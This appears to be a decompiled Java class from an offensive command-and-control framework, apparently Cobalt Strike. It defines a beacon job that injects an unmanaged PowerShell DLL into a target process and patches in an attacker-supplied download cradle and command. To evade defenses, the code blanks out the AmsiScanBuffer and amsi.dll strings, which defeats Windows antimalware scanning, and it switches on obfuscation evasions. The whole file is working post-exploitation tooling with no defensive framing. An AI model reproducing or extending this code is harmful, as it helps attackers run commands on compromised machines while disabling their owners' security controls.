package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class PowerShellJob extends Job {
   protected String task;
   protected String cradle;
   protected String desc = "";

   public PowerShellJob(TaskBeacon var1, String var2, String var3) {
      super(var1);
      this.cradle = var2;
      this.task = var3;
   }

   public String getDescription() {
      return this.isInject() ? "Tasked beacon to psinject: " + this.task + " into " + this.pid + " (" + this.arch + ")" : "Tasked beacon to run: " + this.task + " (unmanaged)";
   }

   public String getShortDescription() {
      return "PowerShell (Unmanaged)";
   }

   public String getDLLName() {
      return "x64".equals(this.arch) ? "resources/powershell.x64.dll" : "resources/powershell.dll";
   }

   public String getPipeName() {
      return "powershell";
   }

   public String getTactic() {
      return "T1086";
   }

   public int getCallbackType() {
      return 32;
   }

   public int getWaitTime() {
      return 10000;
   }

   public boolean ignoreToken() {
      return false;
   }

   public byte[] fix(byte[] var1) {
      Packer var2 = new Packer();
      var2.addStringUTF8(this.cradle + this.task, 8192);
      var1 = CommonUtils.patch(var1, "POWERSHELL ABCDEFGHIJKLMNOPQRSTUVWXYZ", CommonUtils.bString(var2.getBytes()));
      if (!this.tasker.disableAMSI()) {
         var1 = CommonUtils.zeroOut(var1, new String[]{"AmsiScanBuffer", "amsi.dll"});
      }

      return var1;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
